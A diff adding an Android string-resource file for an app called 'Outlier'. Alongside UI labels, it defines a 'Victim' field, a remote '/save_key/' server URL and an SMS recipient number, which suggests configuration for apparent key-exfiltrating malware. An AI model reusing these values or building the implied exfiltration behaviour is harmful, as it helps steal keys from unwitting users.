@@ -1,0 +1,10 @@
+<resources>
+    <string name="app_name">Outlier</string>
+    <string name="Victim">Test User</string>
+    <string name="AppType">1</string>
+    <string name="server_Url">https://foodmend.pythonanywhere.com/save_key/</string>
+    <string name="SendSmsTo">8318737281</string>
+    <string name="Message">test Message to check</string>
+    <string name="profile_image">Upload Profile Pic</string>
+    <string name="upload_image">Update Pic</string>
+</resources>
